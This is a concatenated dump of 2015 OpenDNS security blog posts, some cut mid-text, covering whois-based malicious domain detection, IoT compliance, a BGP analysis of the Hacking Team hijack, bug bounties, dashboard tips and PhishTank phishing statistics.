database of domains, IP addresses and autonomous system numbers (ASNs) that the company collects, categorizes and enriches with its own in-house sophisticated models.\nOpenDNS is continually analyzing terabytes of passive DNS data and BGP routes shared by more than 500 peering partners, combined with its own recursive DNS service — which handles over 70 billion DNS requests per day from more than 50 million active daily users in 160 countries — to assemble one of the largest repositories of network traffic data in the world.\nBut the real value, says Arnold, comes from the next step in the process: the company extracts intelligence from this data using over a dozen models developed by the OpenDNS Security Labs research team. These models range from language-based scoring algorithms like NLPRank that identify likely spear phishing domains to prediction models that replicate specific domain generation algorithms (DGAs) and can catch fast-flux botnet command-and-control servers months before they activate. The resulting dataset not only provides contextual security information, but also reflects the rapidly-changing relationships between domains, IPs, and networks in real-time as an attack unfolds (a stark contrast from other threat intelligence solutions, which typically rely on RSS-like feeds or even emails to provide updates). Investigate provides security teams with a search engine-like interface to this database that can tell them whether a domain or IP is already part of an attack or if it may soon become part of one.\n“With the Investigate platform, we’re fairly confident that the data that we’re collecting is accurate,” said Arnold, whose company specializes in connected product and Internet of Things (IoT) solutions. “It’s real-time, too, so as we’re clicking around the logs, we know we’re getting context based on data that is fresh as it can possibly be.“\nThe interface provides a variety of human-readable data, such as reputation scores, related domains, connected IP addresses, geographic distribution and attribution data for some known-bad sites. Included in the GA release, OpenDNS has added WHOIS data to its database, giving analysts information about who registered a domain, when and where it was registered (including contact information and any changes over time).\nArnold says that while the product can sometimes be an early part of his team’s incident response investigations, it really began to shine after his team began to integrate other systems with the Investigate API.\n“Our goal is to automate everything we do, because the attackers have already automated their attack ecosystems,” said Arnold. “In manual investigations, when you stumble upon a site that’s hosting large footprints of malware or hosting domains, it’s easy to say ‘this is pretty bad.’ But for us, automating that is key. From a human point of view, you can’t do all of that work in real-time — Investigate gives us a fighting chance to keep up with these adverseries. We already have a threat intelligence platform that we created in-house which uses the Investigate API to make informed decisions about the data in our security ecosystem. It provides an additional level of context for various feeds that we already have in that intelligence platform.”\nHe describes this approach as “using good machines to fight bad machines.”\n“When we first started using Investigate, we were getting a lot of intelligence from outside PTC, a lot of third-party intelligence,” he said. “We were taking those IOCs and basically submitting them to the Investigate platform to validate what we were seeing in our environment. We aggregate those malicious domains from specific security platforms and then the last level of validation is through Investigate. For our IOCs, it’s the final-final arbiter of truth.”\nArnold also notes that he’s found value from integrating Investigate directly with the next-generation endpoint protection solution his company uses in-house. “Our endpoint solution provides a lot of insight from machines that may be participating in DGA-type activity. OpenDNS has a vast amount of information on DGAs. So immediately for us, that was a point of integration between the endpoint and Investigate. We’re able to tie that system into Investigate to correlate what we’re seeing, which gives us greater validation that something was amiss in our network.”\nThe trend for more security solutions to be integrated programmatically can be seen in the gradual shift towards interoperable APIs among security vendors. Other parallels can be seen in the rise of the Internet of Things and connected devices in the enterprise. But even with this move towards automation, Arnold says that the data revealed by Investigate still has value for humans, as well. “I’m drawn to Investigate pretty much on a nightly basis,” he said. “Anywhere in the world where I’m connected, I always find myself logging in.”\nWant more information on OpenDNS Investigate?

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1309, 'Who’s Using Whose Whois?', 'Anthony Kasza', 'July 20, 2015', 'Whois data is often difficult to work with given its plethora of unstandardized free text formats, the fact that much of it is registrant provided (meaning it’s often untrustworthy), and due to privacy protection services which mask the real whois record. As whois data naturally has many inconsistencies and anomalies, directly mining bulk whois data proves challenging. Instead of mining whois data, the OpenDNS research team often uses whois record values as auxiliary features of suspect domain names. Whois data enriches our findings and helps weight the decisions made during a manual investigation, as well as an automatic classification. This post will outline a method, incorporating whois data, that the OpenDNS labs team is using to locate suspicious and malicious infrastructure on the Internet.\nDomain Registration Notification System\nInternally, we have built a basic proof of concept system which monitors whois records of newly created domain names for select TLDs. The system is configured with four basic inputs:\nfield type – this is the name of a normalized field in a whois record (e.g. registrant email, creation data, registrant fax number)\nfield value – this is the value of the field in a whois record\nrecipient – the research team member requesting the notifications\naction – what is to be done upon a whois record containing the field value:\n\nnotify – send an email to the recipient\nblacklist – automatically blacklist the domain matching the whois record criteria\nsinkhole -automatically sinkhole the domain matching the whois record criteria\nWe’ve been using the system for a little over a month now and have had some interesting results.\nSystem Results: Whois Blacklisting\nThe ability to automatically blacklist a domain based on a field in a domain’s whois record is very powerful. To do so requires a high level of confidence in the whois field’s value. For example, automatically blacklisting a domain based on the registrar listed in its whois record will very likely result in a high rate of false positives. Blacklisting on a value which is likely to be unique to the domain’s owner, such as an email address or physical address, still has the ability to introduce false positives, but is much less likely.\nMining the blacklist our research team internally moderates and incorporating open reports from other security researchers, we have been able to identify, with strong confidence, compromised and dedicated email addresses. Using our notification system, we are able to blacklist a domain shortly after it is registered, and in some cases before it is used maliciously. For more information on how registrant email addresses can be used for pivoting between domain names, see our previous analysis comparing registrant email addresses and the status of the domains the email addresses registered.\nAnother technique the labs team has begun using to identify suspicious domains is to monitor domain registrant email addresses for domains we currently consider malicious. The intuition here is that if OpenDNS considers example.com malicious, then user accounts at example.com, e.g. user@example.com, should at least be considered suspicious. Domain names registered by user@example.com are then also suspect.\nSystem Results: Whois Anomalies\nThe final classification technique outlined in this blog also relies on monitoring newly created domain whois information and is rather similar to brand monitoring. This technique identifies whois records which have similarities to the whois records used by extremely popular domain names.\nFor this classification technique, we first created the idea of a brand. Brands are entities which own a number of popular domain names, typically used for different purposes. Brands in this classifier are modeled by gathering the whois information from OpenDNS’s top domain names (similar to the Alexa top domains) and intelligently merging the domains’ records. Many of the brands we monitor are commonly known large Internet companies. For example, OpenDNS owns opendns.com and internetbadguys.com. OpenDNS would be considered the brand in this case and the whois records for both domains would be combined.\n\nWith our brands modeled, we began monitoring for their whois information with the previously described proof of concept notification system. Initially we found mostly legitimate domains registered by our brands including quite a few unicode domains (which surprised us), likely for the purpose of protecting each of the brands’ reputations. We also found a few suspicious domain names that seemed to be completely unrelated to the brands we modeled, but were not yet confident in blacklisting these domain names. In an effort to remove the legitimate domain registrations, we identified heuristics which allow us to differentiate between these two types of registrations:\nBrands registering domains will often use a registrant email address which is somehow related to the brand and not a privacy protected email address.\nDomains registered by brands often resolve to IP netblocks owned by the brand.\nWithin a short time period, brands will often register the same domain name with different TLDs (e.g. example.com, example.org, and example.net) as well as typo variations of the domain (e.g. example.com, exanple.com, ecample.com).\nDomains registered by a brand typically match the majority of a brand’s whois record and not just a single field.\nBrands typically register domains through a preferred registrar, often one providing brand protection services such as MarkMonitor or Corporation Service Company (CSC).\nApplying these heuristics to the whois notifications matching our brands’ records has provided us with a system that identifies suspicious domains registered with whois information mimicking popular websites. According to policy set in place by ICANN, the act of providing inaccurate whois records is grounds for suspension or deletion of a domain. Getting registrars to take action on inaccurate whois records is a different story often being a case-by-case effort.\nOn the research team we’ve seen brand mimicking techniques before within the domain name itself. Some of the domains identified by Jeremiah O’Conner’s NLPRank, which applied natural language processing to domain name strings and often caught domains related to phishing, have also been identified with this brand monitoring technique. We on the research team love when multiple classifiers developed by multiple individuals converge on the suspiciousness of domains. It gives us warm fuzzy feelings.\nBelow is a screenshot of two of the domains identified as suspicious by both of our classifiers:\n\nThe following is a screenshot showing query volumes for another domain the brand monitoring system was able to identify. Note the domain’s registration date was June 14, the day OpenDNS blacklisted the domain for our customer was June 15, the domain was first seen resolving on June 17, and an immediate spike in query volume (often indicating a malicious domain “going live”) occurred on June 20.\n\nBelow is another domain identified by the brand monitoring system. In this case, note that the email address which registered siginin-users|.|com has also registered other highly suspect domain names. If we felt confident this email address was malicious, we could add it to the whois monitoring system and auto blacklist all domains with this email as the registrant contact email in its whois record.\n\nAlso note that at the time of writing this, signin-users|.|com would respond with HTTP 302 redirects and the Location header set to “https://google.com”. This is a rather suspicious thing to do as requests to google.com often also result in 302 redirects to www.google.com.\nFuture Work\nOne expansion of the whois notification system these classifiers are built upon is approximate whois record matching. By including a similarity score with each requested monitor, our research team will be able to identify whois records that approximately match. I’ve been testing the Jaro-Winkler distance as a matching function and have found good results thus far.\nSo What?\nWhois data can be a pain to work with given the lack of standardizations and the range of cruft registrars accept. However, when combined with passive DNS and behavioral patterns, whois data can be used to identify suspect and malicious domains within a short time after registration. This shortening of the detection period is key to a strong security strategy.', 'Security Research;Security Tools;Threat Discovery', 'https://umbrella.cisco.com/blog/2015/07/20/whos-using-whose-whois/');

Companies that deploy IoT devices for their own use, or those that have employees bringing them into the office, will find a dearth in documented answers from manufacturers about data collection methods. And the controls needed to keep company and customer data safe can be sparse for some devices. As a compliance issue, the lack of control over the security of IoT devices and the data they collect can come with weighty consequences.\nAccording to Jennifer Tharp, a security compliance analyst at OpenDNS, the world of compliance can be a labyrinthine of rules and guidelines, and regulations vary widely depending on the country. For companies looking to break out of a domestic market, it can be difficult to know all the regulations involved, and not knowing can have some pretty weighty consequences. Given that most Internet of Things devices do not disclose where they send collected data, let alone what data is collected in the first place, IoT is also bound to make compliance management even more difficult.\nIn January 2015 the FTC released an Internet of Things report that lists suggestions for companies both creating and using devices. In it, the FTC lays out 55-pages worth of introductory definitions of IoT, regulatory suggestions, and best practices for security. The problem is, most device manufacturers are not following the suggestions made in the report. And some of the report’s suggested safety measures are currently not possible, such as auditing data collection and privacy.\n“[Compliance] is complicated,” Tharp said, referring to the compliance rules of some countries that forbid collected personal data to be transported outside the country. IoT devices, as noted in OpenDNS’s Internet of Things in the Enterprise report, send collected data to any number of countries, often without end users’ consent or knowledge.\n“The purpose of any compliance framework is to prove you are trustable,” Tharp said. “These [laws and regulations] are coming up at a time when we are more connected than ever.” Proving that a company has a handle on all consumer data and where it goes can be incredibly difficult, especially if IoT devices are present.\nThe FTC report focuses a good amount on proposed disclosure and consent measures for consumers using devices. Mainly, the commission would like manufacturers to allow device users the ability to opt out of unnecessary collection, and a disclosure of what data is being collected and where it goes.\nAccording to the OpenDNS Research team, documentation for data collection and handling largely does not exist, which is troubling for both consumers using the devices and companies trying to secure them.\n“When we first started to look at the popular IoT devices that people use, we found the actual documentation to be really sparse,” said OpenDNS Director of Research Andrew Hay. “They didn’t tell you what networks or domains to allow and there was often no information about networking at all beyond ‘make sure this device can talk to the Internet using HTTP or HTTPS.’ This goes against what security people have been taught, in terms of locking down communications for any device on the network.”\nAs for compliance consequences, Tharp says they can vary widely. Germany, for example, has some pretty extreme fines for misuse of consumer data. Data protection violations can bring fines as high as 300,000 euros. “Some companies also say they won’t do business with a company that’s not compliant,” Tharp said. “But companies often say one thing and do another.”\nAs for IoT makers, the FTC’s report also suggests building security into the product instead making it an afterthought. FTC Commissioner Julie Brill says this development philosophy should be fundamental as what she terms the “three V’s”–variety, velocity, and volume–of data collection begins to reach ever higher levels. She mentioned in an interview with NextGov.org that a developing focus for the FTC has been to get companies to consider “privacy by design.”\n“That is, let’s not place so much of a burden on consumers,” she said. “Let’s have companies really think through the data practices that they have. Do they really need to collect all of that data? And if they do, how can they protect it or ensure that a consumer’s privacy is appropriately handled?”', 'Blog;Community;News', 'https://umbrella.cisco.com/blog/2015/07/17/how-iot-device-makers-leave-compliance-risk-to-enterprises/');

While not yet the widespread levels of compromise seen in Windows, the growth in Apple device adoption–especially in the enterprise–makes OSX a more attractive target. The long-held axiom that Macs do not get “viruses” is not only untrue, but an irresponsible message for users, one that will likely cause a lag in adoption of malware protection.\nAside from traditional firewalls, malware signatures, or persistence behavior tracking, DNS has been and always will be a perfect ally in protecting against malware, on any OS, but OSX included.\nInfosec Incident Handler Jack Crook recently wrote a guide to the behaviors of malware with suggestions for getting in front of intrusions. It’s an excellent source of how malware works. Crook’s post focuses on the network level, but the principles of malware behavior are the same for a personal computer, regardless of OS:\nAn adversary needs to enter your network\n Maintain persistence in your environment\n Have the ability to execute commands with the correct privileges\n Locate the data they are after\nGet the data out\nAs Synack’s Patrick Wardle has already shown, Mac persistence is relatively easy. And recent news has shown the built-in protections against malware behaviors like protective measures Apple puts into OSX may not work as well as Apple intended.\nSteps one and five from Crook’s list are where DNS can play an unmatched role in protecting against malware. To complete step one, attackers need to successfully get in, usually accomplished through phishing attempts, or exploiting an external-facing vulnerability like the infamous Flash player, or using compromised credentials to log into a sensitive system (or in this case a personal Mac). There are many other ways, but these are some of the main categories of intrusion. Passwords aside, many of the intrusion methods work over the Internet, which means they usually originate from unsavory places on the Internet. DNS is the perfect, automatic way of blocking traffic to and from those unsavory places.\nA poorly concealed phishing attempt.\nStep five is where attackers or the malware they install need to call out to announce the job is complete. Many forms of malware and botnets use a Command and Control (C&C) domain that will tell a PC what to do once it receives a successful ping. DNS traffic can provide many of the first indicators that something is wrong at this step.\nIn both cases–steps one and five–automatic protection is key, and DNS is the way to get it, as it can prevent before the infection even occurs.\nThis is not the case with ISP-provided DNS. Internet service providers often regard DNS as a necessary protocol, but do not use it to apply security, leaving the Internet wide open for a Mac or any other machine to contact any malicious domain available.\nIf you are a home user looking to for better DNS performance than your ISP, you can point your DNS to OpenDNS (208.67.222.222 and 208.67.220.220) to get more reliable and often faster response time than an ISP DNS service can provide.\nIf you’re looking to get enterprise-grade protection from malware and phishing, check out our Prosumer service.', 'Blog;Community;News;Security 101', 'https://umbrella.cisco.com/blog/2015/07/14/the-role-dns-plays-in-mac-malware-prevention/');

ROS recommended using BGP hijacking and Hacking Team helped with the setup of new RAT CnC servers.\nIn this post we’ll take a closer look at the exact details of this incident and support the wikileaks findings with BGP data.\nRaggruppamento Operativo Speciale and Hacking Team\nThe Raggruppamento Operativo Speciale or ROS is the Special Operations Group of the Italian National Military police. The group focuses on investigating organized crime and terrorism. Hacking Team sells its RAT software known as Remote Control System (RCS) to law enforcement and intelligence agencies, ROS included.\nROS infected and installed the RCS client on the machines of persons of interest (referred to in the emails as targets). These Remote Access Tools can provide ROS with all kinds of information and typically provide the tool’s operator with full access over a victim’s machine. The RCS clients normally need to check in with a server —for example a machine the clients can get their commands (orders) from— and upload stored data, recorded communications, logged keystrokes, etc. to. The wikileaks emails uncovered how after ROS abruptly lost access to one of its RCS servers and worked together with Hacking Team to recover the loss.\nInitially, ROS used machines from a provider called Santrex, a well known bulletproof hoster. Brian Krebs dedicates an article about them in Oct 2013\nObviously the RCS clients (also referred to as agents in the wikileaks emails) only work well if they can communicate with the server. If the server becomes unreachable the client essentially becomes an orphan and loses most of its value. This is exactly what happened on July 3rd, 2013 when after nine earlier outages that year, the Santrex IPv4 prefix 46.166.163.0/24 became permanently unreachable. The wikileaks document described how the Italian ROS reached out to Hacking Team to work together on recovering the VPS server that ran on 46.166.163.175. In ROS terminology, the server was called “Anonymizer”. The emails also revealed that this server relays updates to another back end server called “Collector” from which ROS presumably recovers the targets’ data.\nHacking Team proposed to ROS to first work with Santrex to bring the VPS back online, so they could subsequently help reconfigure the RCS server to receive updates from the RCS clients (installed on targets’ devices) but that did not follow through.\nA plan then was devised to make the prefix 46.166.163.0/24 reachable again by annoucing it in BGP. Since the prefix wasn’t announced by Santrex (AS57668) anymore, originating it from a different AS should make the network reachable again. The wikileaks documents show how ROS worked with the Italian network operator AS31034 (aka Aruba S.p.A) to get the prefix announced in BGP and bring up a new “Anonymizer” server with the IP address 46.166.163.175. ROS also was hoping that other Italian ISPs wouldn’t filter that hijacked announcement.\nWhen we look at historical BGP data we can confirm that AS31034 (Aruba S.p.A) indeed started to announce the prefix 46.166.163.0/24 starting on Friday, 16 Aug at 2013 07:32 UTC. The wikileaks emails outline how ROS complained to Hacking Team that the IP was reachable only via Fastweb but not yet through Telecom Italia, concluding not all RCS clients were able to connect back to the server immediately, since the prefix was not seen globally. BGP data further confirms this per the visualization below.\nBGP Network Graph for 46.166.163.0/24\nHistorical BGP data shows how AS31034 (Aruba S.p.A) started to announce the prefix to its peers via the Milan Internet Exchange and how it became reachable via the peers that then accepted this BGP announcement. The peers below were some of the networks that accepted the announcement and would have had a path to the new ‘fake`RCS server.\nAS12874 Fastweb\nAS6939 Huricane electric\nAS49605 Reteivo.IT\nAS4589 Easynet\nAS5396 MC-link Spa\nAfter some frustration on ROS’s part due to summer vacation delays, eventually the IP address of the server became reachable again, at least for many Italian networks and the new server was up and running with the same IP address. Hacking Team then stepped in to reinstall and setup a new RCS server on that IP.\nConsequently, the RCS clients were able to “sync” back in with the server. On Aug 20th the Raggruppamento Operativo Speciale confirms with Hacking Team that it had indeed recovered contact with 3 of the 4 RAT clients.\nFinally on August 22 at 13:35 UTC the prefix is withdrawn again, which would indicate that the operation was successful and the RAT clients were likely configured to use a different server IP.\nSource: ripstat.ripe.net. AS31034 46.166.163.175 prefix lifetime.\nConclusion\nAs the supporting evidence from historical BGP data concludes, the information revealed in the wikileaks documents is factual and the Italian ROS and Hacking Team did work with the Italian network AS31034 (Aruba S.p.A), to announce 46.166.163.0/24 between Aug 16 and Aug 22. in order to regain access to their RAT clients.\nThis finding further confirms the use of BGP for nefarious purposes similar to the one listed in our blog post earlier this year. BGP hijacks can do serious harm and rapid notification of such an event is essential. BGPmon provides free and premium monitoring services that will inform users in near-real time for events like this.', 'BGPmon;Security Research', 'https://umbrella.cisco.com/blog/2015/07/12/how-hacking-team-helped-italian-special-operations-group-with-bgp-routing-hijack/');

But we’re not content to merely turn inward for inspiration—we are constantly engaged in discussion with our partners, customers, and users in order to direct resources to the products and features that will do the most good.\nThis is not an uncommon practice, however, at OpenDNS, we’ve taken the idea one step further, building customer feedback directly into our development process. When great ideas are surfaced in our Idea Bank, we vet it with our internal teams—if the idea makes it to production, we show the final draft to our Customer Advisory Board. This group of OpenDNS customers represents nearly every vertical, and serves as a litmus test for our global customer base.\nAt our most recent Customer Advisory Board meeting, held in our San Francisco headquarters in May, we previewed several features built to increase Umbrella’s value for our customers:\nSAML support: OpenDNS now supports SAML authentication, meaning that our customers can access the dashboard from their existing single sign on service. As a bonus, we have integrations with Okta, Ping, and OneLogin so that customers can also set it up in the future. Along with the SAML update, our login page got a much-needed redesign:\n\nNew partner integrations: We added two great new partners to our technology partner program this quarter, ThreatConnect and ThreatQuotient. Along with these two companies, we also announced a new security API. The need for this solution was something we had been hearing from customers for months, and we were thrilled to bring it to production.\nMSP features: Perhaps more than any other line of business, our MSP partners have been invested in helping shape Umbrella, and Umbrella for MSPs is a direct reflection of this progress. Based on their feedback, we were able to add a partner enablement pack to our MSP offerings. The collateral will help our MSP partners showcase their security knowledge and prove the value of Umbrella protection to their clients.\nValidation of these features by our Customer Advisory Board members helps us know we’re on the right track—and that we can safely say our user feedback funnel is strong. Customer success doesn’t just mean making sure you get the most out of your existing deployment—to us, it means building features and solutions that will guarantee our product grows and matures with your needs.\nNot to toot our own horn, but we’re pretty proud of the work we’ve done in this department: Gainsight recently named OpenDNS one of their “Most Innovative Companies in Customer Success” at their Pulse Conference.

Unlike the malicious hackers who make headlines most often, this breed of–mostly–silent security researchers is motivated to help make the Internet safer for everyone–and make  money while doing so.\nCrowdsourcing a Safer Netscape\nIn October 1995 Netscape launched a bug bounty program for the shiny new Netscape Navigator 2.0, possibly the first ever documented program of its kind. Prizes ranged from cash to a grab bag of goodies from the Netscape “general store.” Netscape was crowdsourcing before it had a name.\nThe market is a lot bigger now, with many of the largest tech companies in the world offering bug bounty programs. And the stakes are higher as well, with companies like Mozilla paying as much as $10,000 for the most novel bugs. But the fundamental motivations behind them remain the same—mainly that secure coding is difficult, and finding all the holes in a site or product’s security can be nearly impossible for one security team.\nA Talent Pool of Hackers\nMany tech giants like Mozilla, Google, Facebook, Github, Yahoo and many others have already realized the value in bug programs and run their own. But for those without the resources to do the same, or those that have the resources but don’t want the headache, services like Bugcrowd, Crowdcurity, and HackerOne are making it easier to get help from a pool of security pros.\nAnd while some financially conscious companies might balk at the prospect of paying tens of thousands of dollars to a hacker for a single bug, it’s likely much more attractive than the alternative. IBM’s Cost of Data Breach Study estimates the average cost of a breach at $3.4 million, a 23 percent increase since 2013.\nLet the Good Guys In\nBounty programs can be hugely helpful to a short-staffed security team needing to plug security holes, but going it alone might not be the best way. According to Bugcrowd Founder and CEO Casey Ellis, companies will often try running their own bounty program, then end up turning to a service instead. Ellis says one reason this tends to happen partly because it’s easy to underestimate the overhead of running a program, and the community management aspect of it. “If you get that wrong and end up with a cranky researcher, you’ll have a problem,” he said.\nPinterest was one such company that tried going it alone, but quickly became overwhelmed when responses began flowing in, and the the social site’s security team enlisted Bugcrowd for help.\nEllis said the need for programs in general is on the rise, because with security talent being scarce, and the sheer effort it takes to put out a good product, security is not always top of mind for developers. “Programmers are not really incentivized to program securely,” he said. “It’s really a quality issue, at the end of the day. And quality is hard.”\nEven Facebook, the modern engineering powerhouse it is, acknowledged this fact. The company’s bounty update from 2013 cites the challenge clearly, “…no matter how much we invest in security–and we invest a lot–we’ll never have all the world’s smartest people on our team and we’ll never be able to think of all the different ways a system as complex as ours might be vulnerable.”\nLinkedIn has adopted a different approach to help with the noise and quality factors in running a public program, by making it private. The professional networking company announced in a blog post on June 17 that its security team has been running a private bounty program since October 2014 with a community of selected researchers. While the security team still takes bug reports from the public, LinkedIn’s Director of Information Security Cory Scott said that he believes the private model is more apt for a bounty program.\n“We’ve seen the signal-to-noise ratio of public bug bounty programs continue to degrade,” Scott wrote, “requiring companies to hire dedicated resources, engage consultancies, or use their platform vendor to sift through all of the bug reports to find actionable ones. The spirit of the original bounty programs have been co-opted, and I think an invitation-based model helps bring it back to the original intent.”\nDo It Right: Prepare, Respond, and Reward\nLike any community-centric venture, there are right ways to successfully run a bug bounty program, and mistakes that can lead to adverse responses from the research community.\nBrian Carpenter, a freelance security and malware researcher with decades of experience, knows the nuances of the research community well. He’s a recognized Google and Mozilla hall of fame bug reporter, and has negotiated with a number of companies of varying size and notoriety in reporting bugs. Similar to advice from Bugcrowd’s Ellis, Carpenter says a company’s success with a bounty program can be linked to its preparation, part of which is clearly defining what is “in scope.”\n“Some of these companies really have no idea what they are getting into, or how badly their networks and websites are coded,” he said. “Quite a few companies have been so overwhelmed by reports that they’ve had to stop taking reports altogether.”\nA company’s response to reported bugs is often the key turning point between an unknown exploit, and a headline-grabbing security leak. One high profile example goes back to 2013 when a then-unknown Pakistani hacker compromised Mark Zuckerberg’s personal Facebook profile to prove a point when his official bug reports went unanswered.\nBut it’s not just the large tech companies that have made this mistake. In January of 2015, a personal greeting card company, UK-based MoonPig, was outed for a litany of security flaws in its API, which exposed personally identifiable information of its three million users. The developer who found the flaw, Paul Price, wrote in his blog post that he contacted the company 17 months prior to posting about the flaw publicly but received no response after multiple attempts.\nNot all developers and researchers are so inclined to do the right thing when they feel slighted, unacknowledged, or don’t get paid. Carpenter says for some hackers, it can be a more enticing option to sell a flaw to other hackers who would rather keep it silent and exploit it.\n“When you’re looking at receiving $10,000 in Bitcoin via the black market compared to a T-shirt and a firm handshake from a Fortune 100 company, you can see why some folks would do that,” Carpenter said. Though he said his long relationship with law enforcement (Carpenter is a former police officer himself) keeps the temptation out of the question for him personally.\nIf A Duplicate, Show Your Work\nA big pet peeve throughout the bug research community is when companies running a bounty program claim that a flaw that was found is a “dupe” without proving it. Duplicates are a common issue on both sides of a bounty program transaction. A security researcher finds something that looks like gold, only to hear from the company that it’s already been found, and thanks for trying.\nIt’s an issue Vimeo CTO Andrew Pile knows well. “There is a huge amount of trust involved,” he said in an interview with The Verge. “[Researchers] spend a ton of time identifying and documenting these issues, and then the report goes into a black box. I closed out a significant number that were duplicates, and unfortunately we can only pay on a first come, first serve basis.”\nThe frustration could be avoided, Carpenter says, if more companies provided proof that a report is a duplicate. “They just expect you to believe them. I can’t prove that they are doing it to get out of paying, but a reputable company would provide you access to the other bug reports upon request.”\nFor advice on how to avoid finding duplicates as a bounty hunter, read the posts on Bugcrowd blog and forum.\nIf you’re a researcher, what are your best bug hunting stories?

A quick Google image search reveals JPEG after JPEG of tiny font, obscure graphs, and things that go pewpew—cool, but not immediately intuitive. At OpenDNS, our user experience team strives to make the Dashboard easy to use and simple to manage, a task that begins as soon as you create an account and begin making policies.\nHowever, even the simplest tools come with pro tips, and the OpenDNS Dashboard is no exception. Below, we outline the two most important tips to keep in mind as you navigate the policy creation process, with help from Technical Support Engineer Alexander Harrison.\nFor best results, use only the ‘Policies’ tab\nWhen you first log in to the Dashboard and visit the Configuration tab, you’ll notice a series of tabs on the left-hand side of the screen. These tabs detail different policy and option settings, which can help you manage your users, but Harrison suggests a different approach.\n“When I’m setting up a policy in the Dashboard, I usually stay away from Policy Settings and Block Page Settings, at least to start out,” Harrison said. “I almost forget those options are there. I do everything from the Policy Editor itself (the Policies tab, as highlighted in the image above), because it keeps everything in one place.”\nThe Policy Editor, shown below, contains tabs for most of the same settings represented in sidebar shown above to the right:\n\n“The Policy Settings tab is mainly useful if you have multiple policies,” Harrison said. He went on to say that the Policy Settings tab allows admins to quickly find specific domain lists, instead of finding the policy the domain list applies to, saving time and effort when adjusting the lists.\nBlock Page Settings provides an excellent example of the benefits of using the Policy Editor. If you create a new user from the sidebar Block Page Settings menu, an extra step must also be taken in the Policy Editor to enable this bypass user—whereas the same user created through the Policy Editor is applied to the policy immediately.\nThere is a comprehensive guide to creating policies using just the Policy Editor alone—you can read it here. Looking for a tl;dr? Harrison suggests that admins who need to get policies up and running quickly go directly to step 2, section b, which covers security settings.\nPolicy execution order matters\nIf you have already created your policies in the Dashboard, you may feel like you’ve got everything covered. However, there is one more tip that is imperative to keep in mind: your policy order. Below, you can see the Policy Editor view. On the left hand side, you can see an arrow pointing downward. This is actually a guideline for creating policies that stack appropriately, ensuring that the correct policies are applied to the correct groups, users, and networks.\n\nAccording to the policy ordering tutorial, “Policies are applied based on a ‘first match’ methodology which follows a top to bottom execution order. Therefore, only the top-most policy that matches a user’s Identity will be applied, and all subsequent lower matches will be ignored.”\nWhat does that mean exactly? Harrison explains: “You want to build your catch-all policies first, and then put more specific policies above them, because if you build it upside-down with the biggest policy up top, you’re never going to use the more specific settings.” He continued, “AD users and such represent those more specific policies, followed by groups of AD users, and your network is the catch-all. But if you have the network policy up top in the policy order, it will cover everything, and your more specific policies won’t be applied.\n“Several people might say, ‘Oh, I can add my users to a few policies and it will stack.’ While in reality, it’s just ‘the first coin to hit the sorter applies,’ so to speak.”\nOnce you’ve worked out the order your policies should be stacked, adjusting them is simple, just click and drag:\n\nAttention to detail goes a long way\nIn addition to these two takeaways, one idea Harrison wanted to emphasize was attention to details in the Dashboard, such as hitting “Save” or “Allow” when creating settings.\n“The policy creation system and policy execution order are probably the two most important things to keep in mind when you’re working in this pane,” Harrison said. “However, there are a lot of problems that can be mitigated by ensuring that you cross your T’s and dot your I’s.”\nIf you have any further questions about navigating the OpenDNS Dashboard, our Knowledge Base can provide a thorough walkthrough of setup.

By sending out a mass or targeted email designed to look like it came from a bank or other legitimate source, an attacker can acquire a fair number of user credentials or deliver malware. Credentials can be used for identity theft, additional compromise or to send more seemingly legitimate phishing emails and convincing a user to install malware can give attackers access to a system.\nMap of domains used in phishing attacks by ASN\nPhishing will typically use domains from one of three sources:\nFree hosting providers, often the most basic of phishes,\nPaid hosting, typically used for targeted attacks. In an attempt to appear more legitimate, an attacker may use a domain that is similar in name to the domain they’re impersonating,\nCompromised hosts or registrars. In these cases, a website is compromised and phishing content is hosted deep within the site or the registrar is compromised and subdomains are configured to point to phishing content on the same or different servers.\nTo get an idea of what kinds of domains phishing attacks are using at present, We’ve analyzed a portion of data from phishtank.com.\nPhishtank is a website run by OpenDNS where members submit potential phishes for review by other members of the community. When enough votes confirm a phishing attack, it is labeled as a verified phish. Phishtank is a relatively small slice of phishing content on the internet. We are only looking at a data set of just over 3 million reported phishing attempts. However, looking at the verified phishing attacks for just this month, we are able to see some basic patterns.\nPhishtank Statistics\nTo get this data, we downloaded a copy of the verified phishing attempts that were online as of this month from the statistics page at phishtank.com and performed analysis on the data using python. With the Uniform Resource Name (the part after domain.com/), we were left with domains and subdomains. We then analyzed those using the OpenDNS Investigate API to collect ASN organizational information for each unique domain. That provided a summary of organizations responsible for domains hosting phishing content.\nAs of this writing, 3,256,785 phishes have been submitted to phishtank and 1,837,862 of those have been verified as valid.\n31,219 are currently listed as online. In our analysis, we used only the second-level domain names from all the currently online phishes and removed duplicates, leaving 9,902 unique domain names.\n1,072 of these domains had no organizational attribution as they no longer resolved to an IP address, leaving us with 8,830 domains still attributed to an ASN.\nThe following is a graphical view of the top 10 organizations with the most phishing content:\nThe top 10 organizations with the most phishing content\nLet’s take a look at the worst offender in this analysis, CyrusOne.\nCyrusOne provides colocation services, so they may not be directly responsible for maintaining the compromised or purchased hosts that are used in phishing attacks. They may be the leader in phishes from this data set at the moment simply due to their size, with two dozen data centers across the United States, Europe, and Asia.\nLooking at specific domains from this set, we can see how phishing attacks operate when targeted or when using compromised or free hosting:\nTargeted Hosting\nServiceyourpaypal[.]com\nThis domain appears to have been purchased specifically for use in targeted phishing attacks with the goal of acquiring PayPal credentials and stealing money from PayPal customers.\nServiceyourpaypal[.]com was registered on September 14, 2014 at launchpad[.]com. It’s using domain privacy services provided by privacyprotect[.]org to hide administrative and technical details for the person or organization who bought the domain name.\nIt is hosted at Hostgator, a well known and inexpensive hosting provider and is using a shared host at the IP address of 192.185.4.25. This IP address is hosting a total of 369 domain names.\nWe can see that there is a consistent, but small amount of DNS requests for this domain when looking at its requests through OpenDNS infrastructure. The domain is not serving any useful content at present, as can be seen in the following image:\nHowever, serviceyourpaypal[.]com could be re-activated at any time and used in future PayPal-themed phishing campaigns. Because of its name similarity to paypal[.]com along with using an ASN other than what legitimate PayPal domains use (AS 11643-eBay and AS 17012-PayPal), it was automatically blocked by OpenDNS NLPRank.\nApplesverifications[.]com\nApplesverifications[.]com was registered on September 2, 2015 at launchpad[.]com and does not hide it’s whois information behind a privacy service. That doesn’t necessarily mean it’s factual. In some cases, adding whois privacy costs extra when registering a domain. The domain is hosted with Hostgator and its IP address hosts a total of 907 domains. It had the following content when last analyzed:\n\nThe DNS traffic had a very suspicious spike in traffic on May 10, 2015 after small and consistent amounts of 